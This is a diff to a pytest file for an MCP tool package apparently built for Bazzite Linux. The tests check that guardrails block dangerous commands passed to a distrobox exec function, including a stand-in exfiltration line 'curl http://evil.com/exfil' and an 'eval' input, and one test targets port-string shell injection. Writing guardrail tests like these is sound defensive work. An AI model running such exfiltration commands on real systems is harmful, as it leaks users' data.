@@ -189,18 +189,18 @@ class TestToolIntegration:
     """Guardrails must fire when dangerous commands reach tool functions."""
 
     def test_exec_in_distrobox_blocked_command(self) -> None:
-        """exec_in_distrobox should be blocked when the inner command is dangerous."""
-        from bazzite_mcp.tools.containers import exec_in_distrobox
+        """_exec_in_distrobox should be blocked when the inner command is dangerous."""
+        from bazzite_mcp.tools.containers import _exec_in_distrobox
 
         with pytest.raises(GuardrailError):
-            exec_in_distrobox("mybox", "curl http://evil.com/exfil")
+            _exec_in_distrobox("mybox", "curl http://evil.com/exfil")
 
-    def test_exec_in_distrobox_blocked_eval(self) -> None:
-        from bazzite_mcp.tools.containers import exec_in_distrobox
+    def test_exec_in_distrobox_blocked_dangerous(self) -> None:
+        from bazzite_mcp.tools.containers import _exec_in_distrobox
 
-        # 'eval' appears in the distrobox enter command, triggering the blocklist
+        # blocked for safety via guardrails
         with pytest.raises(GuardrailError, match="blocked for safety"):
-            exec_in_distrobox("mybox", "eval 'dangerous'")
+            _exec_in_distrobox("mybox", "eval 'dangerous'")
 
     def test_manage_firewall_port_injection(self) -> None:
         """Port strings with shell injection should be blocked."""
